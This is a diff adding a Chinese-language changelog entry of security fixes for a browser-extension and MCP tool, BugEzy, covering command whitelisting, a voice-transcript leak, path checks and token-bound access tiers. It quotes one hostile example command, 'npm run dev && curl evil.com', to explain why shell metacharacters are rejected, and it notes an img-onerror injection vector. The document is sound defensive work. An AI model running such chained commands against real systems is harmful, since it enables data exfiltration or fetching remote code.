@@ -1,5 +1,20 @@
 # BugEzy Changelog
 
+## 2026-08-17（Fable5 安全修復：P1×2、P2×5、P3×3）
+
+**PM-368~381**：全套 **628 / 0**（新增 `_verify375` 47 項；`_verify327` 21→37、`_verify362` 依新模型重寫）。
+
+- **PM-368（P1）** `start_terminal_monitor` 白名單 + shell 元字元拒絕，兩道都過才 spawn。**元字元先檢查** —— `npm run dev && curl evil.com` 的第一個 token 是合法的 npm，只看白名單會直接放行。⚠ 副作用：`npm start`、`cargo build`、`node -e` 裡的箭頭函式（`=>` 含 `>`）都會被拒。
+- **PM-369（P1）** 🔴 移除語音逐字稿經 MAIN world 中轉的整條路徑。原本 content 會把**跨頁累積的整份語音緩存**送進 MAIN world，而 MAIN world 與頁面共用 JS 環境——**任何網站監聽 `message` 就能收到使用者在別的分頁講過的話**。型別一併刪除。所有 `postMessage` targetOrigin 由 `'*'` 收成 `'/'`。代價僅是跳頁後語音面板不回填舊頁內容，**錄製一段都不會少**。
+- **PM-370/371（P2）** 匯出／匯入路徑改用 **realpath 正規化**（`path.relative` 只比字串，專案內的 symlink／junction 能繞出去）；匯入補上同樣限制；**JSON 解析錯誤不再回傳原始例外**——`Unexpected token X at position N` 裡的 X 就是檔案內容。
+- **PM-372（P2）** Origin 從「任何 `chrome-extension://`」收緊為 BugEzy 專屬 ID。`manifest.json` 有固定 `key`，開發版 ID 與正式版相同，一般不需設定。
+- **PM-373（P2）** 遮罩**呼叫端限長**（32KB／8KB／32KB），共用 regex 一個字不動。100KB 惡意輸入實測 0~1ms。
+- **PM-374（P2）** 🔴 **閘門預設開啟、tier 綁 token**。移除 `BUGEZY_USER_TIER`（誰都能自稱 agent）。任何查詢失敗一律降級 free——反過來寫會讓「拔網路」變成解鎖手段。**⚠ 重連 MCP 後需設 `BUGEZY_SESSION_TOKEN`，否則只剩 ping／get_page_url 可用。**
+- **PM-375（P3）** 自訂 regex 守衛：限長 200、拒絕巢狀量詞、**新增時預編譯**。⚠ 樣式比對不是完備的 ReDoS 偵測，真正的兜底是 PM-373 的輸入限長。
+- **PM-376（P3）** `decodeURIComponent` 包 try/catch，**失敗後仍然遮罩**（寫成「解不開就放行」反而變成繞過手段）。
+- **PM-378（P3）** 綠界表單改 DOM 建構。原註解「innerHTML 不執行 script」是對的但不足夠——**`<img onerror>` 不受 CSP `script-src` 限制**。另加 action 只接受 `https://*.ecpay.com.tw`（目的地被換掉＝訂單資料送給別人）。
+- **PM-380** per-user 授權稽核（未改碼）：82 處資料表存取全數檢視，**沒有發現「用 client 傳入的 email/user_id 未經 token 校驗」的端點**。標紅兩項待決策：① `mcp_usage` 沒有使用者維度，`get_usage_stats` 回的是**全站**數字（既是資訊外洩也是功能錯誤）② 單筆報告的 MCP 工具只認 `report_id` 不驗擁有者（可能是分享功能的刻意設計，但與 `list_reports` 標準不一致，且付費牆在這條路徑不生效）。
+
 ## 2026-08-17（瀏覽器錯誤 PII 遮罩）
 
 **PM-367**：把 PM-366 列為「待 FOX 決策」的那一項做掉。全套 **567 / 0**（新增 `_verify367` 47 項）。
